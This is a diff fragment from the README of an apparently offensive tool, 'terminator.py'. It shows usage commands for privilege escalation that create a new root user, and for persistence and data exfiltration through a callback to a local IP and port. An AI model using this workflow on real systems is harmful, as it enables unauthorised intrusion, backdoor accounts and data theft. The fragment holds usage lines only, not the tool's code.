@@ -37,7 +37,7 @@ terminator.py will create a .txt file and a Word (.docx) file from terminator's 
 (optional: -w <path_to_directory_wordlist> (otherwise, terminator will use default list))
 
 (stage 2-privilege escalation after gaining shell on target machine):
-- python3 terminator.py priv
+- python3 terminator.py priv -u <new_root_username> -p <new_root_passwd> 
 
 (stage 3-persistence/data exfiltration after gaining root privileges on target machine):
 - python3 terminator.py root -u <new_user_name> -p <new_user_passwd> -l <local_ip> -x <local_listening_port>
